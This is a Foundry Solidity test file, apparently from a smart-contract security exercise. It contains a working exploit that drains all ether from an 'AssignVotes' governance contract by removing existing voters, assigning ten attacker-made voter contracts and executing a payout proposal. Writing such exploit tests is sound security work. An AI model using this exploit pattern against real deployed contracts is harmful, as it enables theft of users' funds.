// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {AssignVotes} from "../src/AssignVotes.sol";

pragma solidity ^0.8.0;

contract AssignVotesTest is Test {
    AssignVotes victimContract;
    address owner = makeAddr("owner");
    address assignerWallet = makeAddr("assignerWallet");
    address attacker = makeAddr("attacker");

    function setUp() public {
        hoax(owner, 10 ether);
        victimContract = new AssignVotes{value: 1 ether}();
        vm.startPrank(assignerWallet);
        victimContract.assign(0x976EA74026E726554dB657fA54763abd0C3a0aa9);
        victimContract.assign(0x14dC79964da2C08b23698B3D3cc7Ca32193d9955);
        victimContract.assign(0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f);
        victimContract.assign(0xa0Ee7A142d267C1f36714E4a8F75612F20a79720);
        victimContract.assign(0xBcd4042DE499D14e55001CcbB24a551F3b954096);
        vm.stopPrank();
    }

    function testAssignVotes() public {
        uint256 nonce = vm.getNonce(attacker);
        uint256 balanceBefore = address(victimContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        address[] memory voters = new address[](5);
        voters[0] = 0x976EA74026E726554dB657fA54763abd0C3a0aa9;
        voters[1] = 0x14dC79964da2C08b23698B3D3cc7Ca32193d9955;
        voters[2] = 0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f;
        voters[3] = 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720;
        voters[4] = 0xBcd4042DE499D14e55001CcbB24a551F3b954096;

        vm.prank(attacker);

        new AssignVotesAttacker(voters, victimContract);

        assertEq(address(victimContract).balance, 0);
        assertEq(vm.getNonce(attacker), nonce + 1);
        assertEq(address(attacker).balance, attackerBalanceBefore + balanceBefore);
    }
}

contract AssignVotesAttacker {
    constructor(address[] memory _voters, AssignVotes assignVotes) {
        assignVotes.createProposal(msg.sender, "", address(assignVotes).balance);
        for (uint256 i = 0; i < _voters.length; i++) {
            assignVotes.removeAssignment(_voters[i]);
        }

        for (uint256 i = 0; i < 10; i++) {
            SampleVoter voter = new SampleVoter(assignVotes);
            assignVotes.assign(address(voter));
            voter.vote();
        }
        assignVotes.execute(0);
    }
}

contract SampleVoter {
    AssignVotes victimContract;

    constructor(AssignVotes _victimContract) {
        victimContract = _victimContract;
    }

    function vote() public {
        victimContract.vote(0);
    }
}
